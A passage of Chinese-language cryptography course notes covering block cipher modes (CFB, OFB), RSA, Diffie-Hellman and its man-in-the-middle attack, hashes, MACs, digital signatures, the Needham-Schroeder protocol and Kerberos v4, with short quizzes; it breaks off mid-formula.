(CFB)</h3><p>与CBC一样，明文单位被链在一起，因此任何明文单位的密码文本都是前面所有明文的一个函数</p><p>块不是b-bit，而是被分成s-bit的片段，s通常是8</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f36.png" alt=""></p><p>I1 = IV </p><p>Ii = LSBb−s(Ii−1) || Ci−1</p><p>Oi = E(K, Ii)</p><p>Ci = Pi ⊕ MSBs(Oi)</p><p>加密：</p><ol><li><p>b-bit的移位寄存器最初设置为初始化向量</p></li><li><p>密文的第一个单元 C1 = P1 ⊕ MSBs (E(K, IV))  </p><p>s-bit的明文 P1  和 加密函数输出的最左s-bit 做异或操作</p></li><li><p>移位寄存器左移 s 位，把C1放在寄存器最右s-bit上</p></li><li><p>持续到所有明文单位都被加密为止</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f37.png" alt=""></p><p>I1 = IV</p><p>Ii = LSBb−s(Ii−1) || Ci−1 </p><p>Oi = E(K, Ii)</p><p>Pi = Ci ⊕ MSBs(Oi) </p><p>解密：</p><p>解密过程大部分与加密相同，除了接收的密文会与加密函数的输出做异或</p><p>P1 = C1 ⊕ MSBs (E(K, IV))</p><blockquote><p>注意使用的是加密函数，而不是解密函数</p></blockquote><p>虽然CFB可以被看作是一个流密码，但它并不符合流密码的典型结构</p><p>典型的流密码将一些初始值和密钥作为输入，生成一个比特流，然后与明文比特进行XOR，而CFB：与明文进行XOR的比特流也取决于明文</p><h3 id="Output-FeedBack-OFB"><a href="#Output-FeedBack-OFB" class="headerlink" title="Output FeedBack (OFB)"></a>Output FeedBack (OFB)</h3><p>与CFB相似，有两处不同：</p><ol><li>对于OFB来说，加密函数的输出被反馈到移位寄存器（CFB：密文被反馈到移位寄存器）</li><li>OFB对整个区块进行操作，而不是对s-bit子集进行操作</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f38.png" alt=""></p><p>Nonce: 每次使用都会重新生成的随机值，时间戳，序列号，或这些的一些组合</p><p>加密：</p><p>I1 = IV a nonce </p><p>Ii = Oi−1  i在2 - N</p><p>Oi = E(K, Ii ) i在2 - N-1</p><p>Ci = Pi ⊕ Oi i在2 - N-1</p><p>$C^<em>_N=P^</em>_N⊕MSB_u(O_N)$</p><ol><li>Oi只取决于key和初始向量</li><li>K和初始向量给定，则所有用于和Pi做异或操作的Oi都会确定下来</li><li>如果两个不同的信息在相同的位置有相同的明文块，攻击者可以确定Oi流的这一部分</li></ol><p>如果最后一块明文块有u个bit&lt;b个bit，就去ON的前u个bit与其异或，余下的b-u个bit被丢弃</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f39.png" alt=""></p><p>解密：</p><p>I1 = IV a nonce </p><p>Ii = Oi−1  i在2 - N</p><p>Oi = E(K, Ii ) i在2 - N-1</p><p>Pi = Ci ⊕ Oi i在2 - N-1</p><p>$P^<em>_N=C^</em>_N⊕MSB_u(O_N)$</p><p>OFB：典型流密码的结构（但一次一个区块）</p><p>产生一个比特流作为初始值和密钥的函数，并将该比特流与明文进行异或</p><p>生成的比特流与明文进行XOR后，其本身是独立于明文（用虚线框突出）</p><p>OFB也可以被用来保持CFB的移位寄存器</p><h3 id="操作模式的反馈特性"><a href="#操作模式的反馈特性" class="headerlink" title="操作模式的反馈特性"></a>操作模式的反馈特性</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f40.png" alt=""></p><p>除了ECB之外，其他的操作模式都涉及反馈</p><p>将加密视为从一个长度等于加密块长度的输入寄存器中获取输入，并将输出存储在一个输出寄存器中</p><p>输入寄存器通过反馈机制每次更新一个块，每次更新后，加密算法被执行，在输出寄存器中产生一个结果，同时，一个明文块被访问</p><p>OFB和CTR：输出与明文和密文无关，因此，它们是流密码的天然候选者</p><h3 id="Quiz-1"><a href="#Quiz-1" class="headerlink" title="Quiz"></a>Quiz</h3><ol><li><p>对于CBC，证明C4依赖P1, P2, P3, P4</p><p>C1 = E(K, IV ⊕ P1) </p><p>C2 = E(K, C1 ⊕ P2) = E(K, E(K, IV ⊕ P1) ⊕ P2)</p><p>C3 = E(K, C2 ⊕ P3) = E(K, E(K, E(K, IV ⊕ P1) ⊕ P2) ⊕ P3)</p><p>C4 = E(K, C3 ⊕ P4) = E(K, E(K, E(K, E(K, IV ⊕ P1) ⊕ P2) ⊕ P3) ⊕ P4)</p></li><li><p>证明如果P3=P2, C3≠C2</p><p>C2 = E(K, C1 ⊕ P2) = E(K, E(K, IV ⊕ P1) ⊕ P2) </p><p>C3 = E(K, C2 ⊕ P3) = E(K, E(K, E(K, IV ⊕ P1) ⊕ P2) ⊕ P2) ≠ C2</p></li></ol><h2 id="公钥加密"><a href="#公钥加密" class="headerlink" title="公钥加密"></a>公钥加密</h2><h3 id="key分配问题"><a href="#key分配问题" class="headerlink" title="key分配问题"></a>key分配问题</h3><p>对称加密（如DES和AES）要求双方共享一个共同的秘密密钥，问题是如何安全地分配这个密钥，通常情况下，安全系统的失败是由于密钥分配方案的破坏</p><p>A和B有不同的密钥分配方案</p><ol><li>A可以选择密钥并实际交付给B</li><li>如果A和B以前有过通信，他们可以使用以前的密钥来加密新的密钥</li><li>第三方可以选择并传递密钥给A和B</li><li>如果A和B与第三方C有安全通信，C可以在A和B之间传递密钥</li></ol><h3 id="key的层次结构"><a href="#key的层次结构" class="headerlink" title="key的层次结构"></a>key的层次结构</h3><p>session key</p><p>用于加密用户之间的数据，持续1个会话，然后丢弃</p><p>Master key</p><p>用于加密session keys，由用户和密钥分配中心key distribution center KDC共享</p><p>大型网络需要分层的KDC，但需要相关代理之间相互信任</p><p>会话密钥的寿命应该受到限制，以提高安全性</p><p>代表用户使用自动密钥分配，但必须信任系统</p><p>使用去中心化的密钥分配</p><h3 id="公钥加密的动机"><a href="#公钥加密的动机" class="headerlink" title="公钥加密的动机"></a>公钥加密的动机</h3><p>由于两个问题：</p><ol><li>秘钥分配问题</li><li>签名问题</li></ol><p>而且对于多个用户，如1000个，使用对称加密的话则需要多达499500个对称秘钥</p><p>A的私钥表示：$K^{-1}_A$</p><p>A的公钥表示：$K_A$</p><p>对于对称加密来说：</p><p>工作需要：</p><ol><li><p>加密和解密使用相同的算法与相同的密钥</p></li><li><p>发送方和接收方必须共享算法和密钥</p></li></ol><p>安全所需：</p><ol><li>密钥必须保密</li><li>如果密钥被保密，要破译一个信息必须是不可能的，或者至少是不切实际的</li><li>对算法的了解加上密码文本的样本，必须不足以确定密钥</li></ol><p>对于非对称加密来说：</p><p>工作需要：</p><ol><li><p>一种算法用于加密，一种相关算法用于解密，有一对钥匙，一个用于加密，一个用于解密</p></li><li><p>发送方和接收方必须各自拥有一对匹配的密钥中的一个（不是同一个）</p></li></ol><p>安全所需：</p><ol><li>两把钥匙中的一把必须保密</li><li>如果其中一把钥匙是保密的，要破译一个信息必须是不可能的，或者至少是不切实际的</li><li>对算法的了解加上其中一把钥匙和密码文本的样本必须不足以确定另一把钥匙</li></ol><p>对于多个用户，如1000个，使用非对称加密的话则需要2000个密钥即可</p><p>公钥加密可以达到confidentiality和authentication，而且可以同时达到</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f41.png" alt=""></p><p>先将明文用A自己的私钥加密，再用B的公钥加密</p><p>则B只需要先用自己的私钥解密，然后再用A的公钥解密，即同时达到了机密性和认证</p><p>Z = E(PUb, E(PRa, X)) and X = D(PUa, D(PRb, Z))</p><h3 id="三种应用"><a href="#三种应用" class="headerlink" title="三种应用"></a>三种应用</h3><ol><li><p>加解密</p></li><li><p>key交换</p><p>双方合作，交换一个session key，可能有不同的方法，涉及一方或双方的私钥</p></li><li><p>数字签名</p><p>发送者用其私钥 签署 信息，签名是通过应用于信息或作为信息函数的小块数据（通常是信息的加密散列）的加密算法实现的</p></li></ol><h3 id="One-way-function"><a href="#One-way-function" class="headerlink" title="One-way function"></a>One-way function</h3><p>A function f : X → Y is a one-way function, if f is “easy” to compute for all x ∈ X, but $f^{-1}$ is “hard” (or “infeasible”) to compute</p><p>Easy: generally, defined to mean a problem that can be solved in polynomial time as a function of input length. 一般来说，定义为可以在多项式时间内解决的问题，是输入长度的一个函数</p><p>If input length is n bits, then time to compute function is proportional to $n^a$ , where a is a fixed constant. 如果输入长度为n比特，那么计算函数的时间与$n^a$成正比，其中a是一个固定常数</p><p>Infeasible: effort to solve problem grows faster than polynomial time as a function of input size. 解决问题的努力比作为输入大小的函数的多项式时间增长得快</p><p>Time to compute function proportional to $2^n$ for input length n bits. 当输入长度为n比特时，计算函数的时间与$2^n$成正比</p><p>Difficult to determine if a particular algorithm exhibits this complexity. 很难确定一个特定的算法是否表现出这种复杂性</p><p>Computational complexity traditionally focuses on worst-case or average-case complexity of an algorithm, but cryptography requires that it be infeasible to invert a function for virtually all inputs. 计算复杂度传统上侧重于算法的最坏情况或平均情况的复杂度，但密码学要求对几乎所有的输入来说，反转一个函数是不可行的</p><h3 id="Trapdoor-one-way-function"><a href="#Trapdoor-one-way-function" class="headerlink" title="Trapdoor one-way function"></a>Trapdoor one-way function</h3><p>A trapdoor one-way function is a one-way function $f_k$ : X → Y where, given extra information k (the trapdoor information) it is feasible to find, for y ∈ Image(f), an x ∈ X where $f_k$(x) = y.</p><p>Hence, a trapdoor one-way function is a family of invertible functions fk such that computing </p><p>Y =  $f_k$(X) is easy if k and X are known </p><p>X =  $f^{-1}_k$(Y) is easy if k and Y are known </p><p>X = $f^{-1}_k$(Y) is infeasible if Y is known but k is not known</p><p>Example: Computing modular cube roots is easy when p and q are known (basic number theory).</p><h2 id="数论相关"><a href="#数论相关" class="headerlink" title="数论相关"></a>数论相关</h2><h3 id="Euclid’s-algorithm-求最大公因子"><a href="#Euclid’s-algorithm-求最大公因子" class="headerlink" title="Euclid’s algorithm 求最大公因子"></a>Euclid’s algorithm 求最大公因子</h3><p>Euclid(a, b)</p><ol><li>if b = 0 then return a </li><li>else return Euclid(b, a mod b)</li></ol><h3 id="Extended-Euclid’s-algorithm"><a href="#Extended-Euclid’s-algorithm" class="headerlink" title="Extended Euclid’s algorithm"></a>Extended Euclid’s algorithm</h3><p>计算系数x和y使得gcd(a, b) = (a × x) + (b × y)</p><p>Extended-Euclid(a, b) </p><ol><li>if b = 0 then return (a, 1, 0) </li><li>else </li><li>(d’, x’, y’) ← Extended-Euclid(b, a mod b) </li><li>(d, x, y) ← (d’, y’, x’ − ($\lfloor \frac{a}{b} \rfloor$ × y’)) </li><li>return (d, x, y)</li></ol><h3 id="共模性质"><a href="#共模性质" class="headerlink" title="共模性质"></a>共模性质</h3><ol><li>if a $=_n$ b, b $=_n$ c, then a $=_n$ c</li><li>a · b $=_n$ (a mod n) · (b mod n) ·∈ {+, -, ×}</li><li>if a1 $=_n$ b1, a2 $=_n$ b2, then (a1+a2) $=_n$ (b1+b2), (a1×a2) $=_n$ (b1×b2)</li><li>if n|(a-b), then a $=_n$ b</li></ol><h3 id="关于取模的两个定理"><a href="#关于取模的两个定理" class="headerlink" title="关于取模的两个定理"></a>关于取模的两个定理</h3><ol><li>if (b×c) mod a = 1 then c = $b^{-1}$ mod a</li><li>Fermat’s little theorem 费马小定理 $a^{n-1} =_n 1$  a与n互质，且n是质数</li></ol><h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><p>对于正整数n</p><p>n的complete set of residues 是 0, …, n-1</p><p>reduced set of residues 是complete set中与n互质的数</p><p>reduced set of residues中元素的数量叫做欧拉函数，即欧拉函数就是小于n的正整数中与n互质的的数的个数</p><p>性质：</p><ol><li>$\phi(p)=p-1$ p为质数</li><li>$\phi(p\times q)=\phi(p)\times\phi(q)=(p-1)\times(q-1)$ pq都为质数，且p≠q</li></ol><p>所以费马小定理也可以写为$a^{\phi(n)} =_n 1$</p><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>block cipher</p><p>RSA的安全性在于大数的分解</p><ol><li>n为发送方和接收方同意的一个数</li><li>每块的二进制值的十进制形式&lt;n，将该值记为M</li><li>选好数e和数d</li></ol><script type="math/tex; mode=display">C=M^e\ mod\ n</script><script type="math/tex; mode=display">M=C^d\ mod\ n</script><p>公钥为(e, n)秘钥为(d,n)</p><ol><li>e和d应该满足$M^{ed}\ mod\ n=M$</li><li>计算$M^e\ mod\ n$和$C^d\ mod\ n$是容易的</li><li>已知e和n，不能得到d</li></ol><script type="math/tex; mode=display">ed\ mod\ \phi(n)=1</script><p>key的产生：</p><ol><li>选择两个大的质数p和q</li><li>计算n=pq和$\phi(n)=(p-1)\times(q-1)$</li><li>选择一个e，且1&lt;e&lt;$\phi(n)$，与$\phi(n)$互质</li><li>计算$d=e^{-1}\ mod\ \phi(n)$ （用Extended Euclid’s algorithm求解，1=$\phi(n)$×x+e×y，y就是要求的d，注意1&lt;d&lt;$\phi(n)$）</li><li>公开(e,n)，私有(d,n)，丢弃p和q</li></ol><p>整个过程中n,e为公开，p,q,d为私有</p><h2 id="用于对称密钥分配的非对称加密算法"><a href="#用于对称密钥分配的非对称加密算法" class="headerlink" title="用于对称密钥分配的非对称加密算法"></a>用于对称密钥分配的非对称加密算法</h2><h3 id="使用RSA进行对称密钥分配"><a href="#使用RSA进行对称密钥分配" class="headerlink" title="使用RSA进行对称密钥分配"></a>使用RSA进行对称密钥分配</h3><ol><li>A使用B的公钥(e,n)加密M，K为对称密钥，C=($K^e$ mod n, $E_k$(M))</li><li>B用私钥(d,n)解密C，将C分为(C1, C2)，K=$C_1^d$ mod n，M=$D_K(C_2)$</li></ol><p>具体应用为SSL协议</p><h3 id="Diffie-Hellman-key-exchange"><a href="#Diffie-Hellman-key-exchange" class="headerlink" title="Diffie-Hellman key exchange"></a>Diffie-Hellman key exchange</h3><p>只有当双方的真实性能够被确定时，该协议才是安全的</p><h4 id="元根-primitive-root"><a href="#元根-primitive-root" class="headerlink" title="元根 primitive root"></a>元根 primitive root</h4><p>质数p的元根是指：幂次可以生成1, …, p − 1 的数</p><p>$s^1$ mod p, $s^2$ mod p, …, $s^{p-1}$ mod p就是一组1到p-1的一个排列</p><p>对于任意正整数b和质数p的元根s来说，都可以找到一个幂次i，使得</p><script type="math/tex; mode=display">b=s^i\ mod\ p\ (1\le i\le p-1)</script><p>i为模p意义下，以s为底的b的离散对数</p><h4 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h4><p>质数q和它的一个元根α都是公开的</p><ol><li>A和B各自生成一个小于q的随机数$X_A$，$X_B$，作为各自私钥</li><li>A计算$Y_A=\alpha^{X_A}\ mod\ q$，B计算$Y_B=\alpha^{X_B}\ mod\ q$，$Y_A$，$Y_B$就作为各自的公钥，互相交换公钥</li><li>A计算$K_A=Y_B^{X_A}\ mod\ q$，B计算$K_B=Y_A^{X_B}\ mod\ q$，显然这里$K_A=K_B$</li></ol><p>显然这个key都没有被传输</p><p>安全性取决于离散对数的计算，这里$X_A$是$Y_A$的离散对数，$X_B$是$Y_B$的离散对数</p><h4 id="man-in-the-middle-attack"><a href="#man-in-the-middle-attack" class="headerlink" title="man-in-the-middle attack"></a>man-in-the-middle attack</h4><p>由于key是未经过认证的，导致了中间人攻击</p><ol><li>攻击者C产生两个随机的私钥，$X_{C_1}$，$X_{C_2}$，然后计算$Y_{C_1}=\alpha^{X_{C_1}}\ mod\ q$和$Y_{C_2}=\alpha^{X_{C_2}}\ mod\ q$</li><li>A计算$Y_A=\alpha^{X_A}\ mod\ q$，C拦截$Y_A$将$Y_{C_1}=\alpha^{X_{C_1}}\ mod\ q$传给B，同时计算$K_2=(Y_A)^{X_{C_2}}\ mod\ q=\alpha^{X_AX_{C_2}}\ mod\ q$</li><li>B收到$Y_{C_1}$，用自己的$X_B$计算$K_B=(Y_{C_1})^{X_B}\ mod\ q= \alpha^{X_{C_1}X_B}\ mod\ q$</li><li>C拦截$Y_B$，将$Y_{C_2}=\alpha^{X_{C_2}}\ mod\ q$传给A，同时计算$K_1=(Y_B)^{X_{C_1}}\ mod\ q=\alpha^{X_BX_{C_1}}\ mod\ q=K_B$</li><li>A收到$Y_{C_2}$，计算$K_A=(Y_{C_2})^{X_A}\ mod\ q= \alpha^{X_{C_2}X_A}\ mod\ q=K_2$</li></ol><p>至此，A和B认为共享了一个秘钥key，然而其实是A与C共享$K_A=K_2$，B与C共享$K_B=K_1$</p><p>该攻击可以通过digital signatures and public-key certificates克服，以达到A和B的双向认证，即add an exchange of digitally signed identification (ID) tokens</p><h4 id="多个参与者使用Diffie-Hellman"><a href="#多个参与者使用Diffie-Hellman" class="headerlink" title="多个参与者使用Diffie-Hellman"></a>多个参与者使用Diffie-Hellman</h4><ol><li>A生成$X_A$，将$Y_A=\alpha^{X_A}\ mod\ q$发给B</li><li>B生成$X_B$，将$Y_B=\alpha^{X_B}\ mod\ q$发给C</li><li>C生成$X_C$，将$Y_C=\alpha^{X_C}\ mod\ q$发给A</li><li>A将$Y’_C=Y_C^{X_A}\ mod\ q$发给B</li><li>B将$Y’_A=Y_A^{X_B}\ mod\ q$发给C</li><li>C将$Y’_B=Y_B^{X_C}\ mod\ q$发给A</li><li>A计算$K=Y’{_B}^{X_A}$</li><li>B计算$K=Y’{_C}^{X_B}$</li><li>C计算$K=Y’{_A}^{X_C}$</li></ol><script type="math/tex; mode=display">K=\alpha ^{X_AX_BX_C}\ mod\ q</script><p>扩展到n个：</p><script type="math/tex; mode=display">K=\alpha ^{X_1X_2...X_n}\ mod\ q</script><h3 id="El-Gamal-variant-of-Diffie-Hellman-key-exchange"><a href="#El-Gamal-variant-of-Diffie-Hellman-key-exchange" class="headerlink" title="El Gamal variant of Diffie-Hellman key exchange"></a>El Gamal variant of Diffie-Hellman key exchange</h3><ol><li>同样，有q和α，E为一个对称加密函数</li><li>A生成$X_A$，将$Y_A=\alpha ^{X_A}\ mod\ q$发给B</li><li>B生成$X_B$，计算$Y_B=\alpha ^{X_B}\ mod\ q$，和$K=Y_A^{X_B}\ mod\ q$，将(E(M, K), $Y_B$)发给A</li><li>A计算$K=Y_B^{X_A}\ mod\ q$，使用K解密E(M, K)</li></ol><h3 id="Massey-Omura-scheme"><a href="#Massey-Omura-scheme" class="headerlink" title="Massey-Omura scheme"></a>Massey-Omura scheme</h3><p>基于离散对数问题的无共享密钥的加密技术</p><p>质数p公开，</p><p>A和B各自选择自己私有的e和d，使得ed mod (p-1) = 1</p><p>所以(p-1) | (ed-1)，即ed=k(p-1)+1</p><p>for all m ∈ {1, . . . p − 1}</p><script type="math/tex; mode=display">m^{ed}\ mod\ p=m^{k(p-1)}\times m\ mod\ p=m\ mod\ p=m</script><ol><li>A -&gt; B: $m^{e_A}\ mod\ p$</li><li>B -&gt; A: $m^{e_Ae_B}\ mod\ p$</li><li>A -&gt; B: $m^{e_Ae_Bd_A}\ mod\ p(=m^{e_B})$</li><li>$m^{e_Ae_Bd_Ad_B}\ mod\ p(=m)$</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f42.png" alt=""></p><h3 id="Quiz-2"><a href="#Quiz-2" class="headerlink" title="Quiz"></a>Quiz</h3><ol><li><p>If an efficient factoring algorithm for large numbers is discovered, which of the following cryptographic algorithms will become insecure?</p><p>RSA</p></li><li><p>If an efficient discrete logarithm algorithm for large numbers is discovered, which of the following cryptographic algorithms will become insecure?</p><p>Diffie-Hellman key exchange, El Gamal</p></li><li><p>When the data must arrive at the receiver exactly as they were sent, what are we speaking of?</p><p>Message integrity</p></li></ol><h2 id="信息完整性和加密散列"><a href="#信息完整性和加密散列" class="headerlink" title="信息完整性和加密散列"></a>信息完整性和加密散列</h2><p>Message or data integrity is the property that data has not been altered in an unauthorized manner since the time it was created, transmitted, or stored by an authorized source.</p><p>In operating systems, access control can be used to ensure data integrity. In open networks, one uses cryptographic means.</p><p>信息或数据的完整性是指数据自被授权源创建、传输或存储以来，没有被以未经授权的方式改变的属性</p><p>在操作系统中，可以使用访问控制来确保数据的完整性。在开放网络中，人们使用加密手段</p><h3 id="哈希函数h-x"><a href="#哈希函数h-x" class="headerlink" title="哈希函数h(x)"></a>哈希函数h(x)</h3><ol><li>Compression: h maps an input x of arbitrary bit length to an output h(x) of fixed bit length n. </li><li>Polynomial time computable.</li></ol><h3 id="加密哈希函数Cryptographic-hash"><a href="#加密哈希函数Cryptographic-hash" class="headerlink" title="加密哈希函数Cryptographic hash"></a>加密哈希函数Cryptographic hash</h3><ol><li><p>满足哈希函数性质</p></li><li><p>One-way (or pre-image resistant)</p><p>Given y, it is hard to compute an x where h(x) = y</p></li><li><p>2nd-preimage resistance: It is computationally infeasible to find a second input that has the same output as any specified input, i.e., given x to find an x’ ≠ x such that h(x) = h(x’)</p></li><li><p>Collision resistance: It is difficult to find two distinct inputs x, x’ where h(x) = h(x’)</p></li></ol><p>Hash value also called message digest or modification detection code. 哈希值也被称为信息摘要或修改检测代码</p><h3 id="生日悖论-Birthday-paradox"><a href="#生日悖论-Birthday-paradox" class="headerlink" title="生日悖论 Birthday paradox"></a>生日悖论 Birthday paradox</h3><p>生日悖论是指，如果一个房间里有23个或23个以上的人，那么至少有两个人的生日相同的概率要大于50%。这就意味着在一个典型的标准小学班级(30人)中，存在两人生日相同的可能性更高</p><p>对于60或者更多的人，这种概率要大于99%。从引起逻辑矛盾的角度来说生日悖论并不是一种悖论，从这个数学事实与一般直觉相抵触的意义上，它才称得上是一个悖论。大多数人会认为，23人中有2人生日相同的概率应该远远小于50%。计算与此相关的概率被称为生日问题，在这个问题之后的数学理论已被用于设计著名的密码攻击方法：生日攻击</p><h2 id="信息认证"><a href="#信息认证" class="headerlink" title="信息认证"></a>信息认证</h2><p>信息认证：</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f43.png" alt=""></p><p>用户认证：</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f44.png" alt=""></p><p>注意两者的不同</p><h3 id="信息认证码-Message-Authentication-Codes-MACs"><a href="#信息认证码-Message-Authentication-Codes-MACs" class="headerlink" title="信息认证码 Message Authentication Codes (MACs)"></a>信息认证码 Message Authentication Codes (MACs)</h3><p>A MAC algorithm is a family of hash functions $h_K$ parameterized by a secret key K</p><p>$h_K$must be computation-resistant: given zero or more MAC pairs (xi, $h_K$(xi)), it is infeasible to compute (x, $h_K$(x)) for any new input x ≠ xi</p><p>即使知道了多个MAC pair(x1, $h_K$(x1)), …, (xi, $h_K$(xi))，也不能用一个新的x得到MAC pair(x, $h_K$(x))</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f45.png" alt=""></p><p>所以对于使用MAC的信息认证来说：</p><p>A传输信息M和MAC，B只需要验证M’是否等于$h_K$(M’)即可，所以它可以完成信息认证</p><h3 id="数字签名-Digital-signatures"><a href="#数字签名-Digital-signatures" class="headerlink" title="数字签名 Digital signatures"></a>数字签名 Digital signatures</h3><p>M is set of messages that can be signed 被签名的信息的集合</p><p>S is set of elements called signatures 为签名的元素集合，集合都是公开的</p><p>A的signing transformation：$S_A$: M -&gt; S 该转换是私有的</p><p>A的verification transformation：$V_A:M\times S$ -&gt; {true, false}，该转换是公开的</p><p>$S_A$和$V_A$提供了digital signature scheme for A</p><p>实现：</p><p>使用可逆公钥加密系统实现</p><blockquote><p>即$D_d(E_e(m))=E_e(D_d(m))=m$</p></blockquote><p>所以是signing trasfromation $S_A$为$D_d$，即$s=D_d(m)$</p><p>$E_e:M-&gt; C$，M=C</p><script type="math/tex; mode=display">V_A(m,s)=\begin{cases}true,&\text{if $E_e(s)=m$}\\false,&\text{otherwise}\end{cases}</script><h4 id="伪造攻击"><a href="#伪造攻击" class="headerlink" title="伪造攻击"></a>伪造攻击</h4><ol><li>攻击者从S（就是C）中选择一个s，计算$m=E_e(s)$</li><li>S=M，所以(m,s)可以作为一个带着签名的信息</li><li>那么verification会返回true即使签名所有者完全没有涉及这个过程</li></ol><p>解决方案：</p><p>取M的非常小的一个子集M’</p><script type="math/tex; mode=display">V_A(s)=\begin{cases}true,&\text{if $E_e(s)\in M'$}\\false,&\text{otherwise}\end{cases}</script><h4 id="RSA的应用"><a href="#RSA的应用" class="headerlink" title="RSA的应用"></a>RSA的应用</h4><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f46.png" alt=""></p><p>A将m哈希运算之后的值进行签名，攻击者虽然可以使用公钥解密，但是由于哈希函数的性质，并不能从h(m)恢复为m，而且也很难找到m’使得h(m’)=h(m)，即使找到了，也没有私钥将h(m)重新进行加密，接收者只需要验证接收到的m哈希运算，与接收到的$D_dh(m)$公钥解密结果进行比较即可</p><h3 id="Quiz-3"><a href="#Quiz-3" class="headerlink" title="Quiz"></a>Quiz</h3><p>MACs and digital signatures both serve to authenticate the content of a message. Which of the following best describes how they differ? </p><p>a. A MAC can be verified based only on the message, but a digital signature can only be verified with the key used to sign the message. </p><p>b. A MAC can be verified based only on the message, but a digital signature can only be verified with the public key of the party that signed the message. </p><p>c. A MAC can only be verified with the key used to generate it, but a digital signature can be verified with the public key of the party that signed the message. </p><p>d. A MAC can only be verified with the key used to generate it, but a digital signature can be verified based only on the message.</p><p>c正确</p><p>a. 错在你需要的不仅仅是信息来验证MAC，而且你不使用私钥来验证数字签名</p><p>b. 错在你需要的不仅仅是信息来验证MAC</p><p>d. 错在你需要的不仅仅是信息来验证数字签名</p><h2 id="安全协议"><a href="#安全协议" class="headerlink" title="安全协议"></a>安全协议</h2><p>A protocol consists of a set of rules (conventions) that determine the exchange of messages between two or more principals. In short, a distributed algorithm with emphasis on communication</p><p>协议由一套规则（约定）组成，确定两个或多个委托人之间的信息交流。简而言之，一个强调通信的分布式算法</p><p>Security (or cryptographic) protocols use cryptographic mechanisms to achieve security objectives.</p><p>安全（或加密）协议使用加密机制来实现安全目标</p><h3 id="The-Needham-Schroeder-Public-Key-Protocol-NSPK"><a href="#The-Needham-Schroeder-Public-Key-Protocol-NSPK" class="headerlink" title="The Needham-Schroeder Public Key Protocol (NSPK)"></a>The Needham-Schroeder Public Key Protocol (NSPK)</h3><ol><li>$A-&gt; B: \{NA, A\}_{K_B}$ A产生一个nonceA，和A（这个A仅仅是标志自己身份的一个信息）一起打包，然后用B的公钥加密</li><li>$B-&gt; A: \{NA, NB\}_{K_A}$ B解密之后，添加了自己的nonceB，用A的公钥加密</li><li>$A-&gt; B: \{NB\}_{K_B}$ A解密之后，去掉自己的nonceA，看到了nonceB，则认为对方是B</li></ol><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f47.png" alt=""></p><p>第一轮C解密之后，用B的公钥加密再转发</p><p>第二轮B发送用A的公钥加密的信息，C只需要转发即可</p><p>第三轮重复解密之后用B的公钥加密的操作</p><p>举个例子：</p><p>高手A与菜鸡C下棋，同时菜鸡C开启另一场与高手B的棋局，然后将A的落子复制到与B的棋局中，然后将B的落子再复制到A的棋局中，实现了中间人攻击</p><p>造成攻击的原因：</p><p>$B-&gt; A: \{NA, NB\}_{K_A}$ 这一步出现了问题，B应该在这一轮添加自己的信息$\{NA, NB, B\}_{K_A}$</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f48.png" alt=""></p><p>第二轮的时候，因为C无法解密$\{NA, NB, B\}_{K_A}$，A发现里面的信息竟然是B，不是C，所以终止会话</p><h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><p>Kerberos协议本想实现认证、会计和审计，但最后只实现了认证</p><h4 id="requirements"><a href="#requirements" class="headerlink" title="requirements"></a>requirements</h4><p>Secure: An eavesdropper should not be able to impersonate users. 窃听者不应该能够冒充用户</p><p>Reliable: As many services depend on Kerberos for access control, it must be highly reliable and support a distributed architecture, where one system can back up another. 由于许多服务依赖 Kerberos 进行访问控制，它必须是高度可靠的，并支持分布式结构，即一个系统可以备份另一个系统</p><p>Transparent: Each user should enter a single password to obtain network services and should be unaware of underlying protocols. Nowadays, this is referred to as single sign-on. 每个用户都应该输入一个密码来获得网络服务，而且应该不知道底层协议的情况。现在，这被称为单点登录</p><p>Scalable: The system should scale to support large numbers of users and servers; this suggests a modular, distributed architecture 系统应该能够支持大量的用户和服务器；这表明一个模块化的分布式结构</p><h4 id="Kerberos-version-4"><a href="#Kerberos-version-4" class="headerlink" title="Kerberos version 4"></a>Kerberos version 4</h4><p>架构：</p><p>Authentication server (KAS) 认证用</p><p>Ticket granting server (TGS) 授权用</p><p>服务器检查TGS票据的服务，以控制对服务和资源的访问</p><p>过程：</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f49.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f50.png" alt=""></p><p>认证过程1，2 每个用户登录会话执行一次</p><ol><li><p>A -&gt; KAS: A, TGS </p><p>A登录工作站，请求网络资源</p></li><li><p>KAS -&gt; A: <script type="math/tex">\{K_{A,TGS}, TGS, T_1, \underbrace{\{A, TGS, K_{A,TGS}, T_1\}_{K_{KAS, TGS}}}_{\text{AuthTicket}}\quad\}_{K_{AS}}</script>  </p><p>KAS访问数据库，发给A一个session key即$K_{A, TGS}$和一个加密票据AuthTicket，$K_{A, TGS}$有几个小时的寿命（取决于应用程序）由时间戳$T_1$标记，$K_{AS}$由用户密码获得，A可以输入密码解密整个由KAS发来的信息，A logged out时，$K_{A, TGS}$会失效</p></li></ol><p>授权过程3，4 每种类型的服务执行一次</p><ol><li><p>A -&gt; TGS: $\underbrace{\{A, TGS, K_{A,TGS}, T_1\}_{K_{KAS, 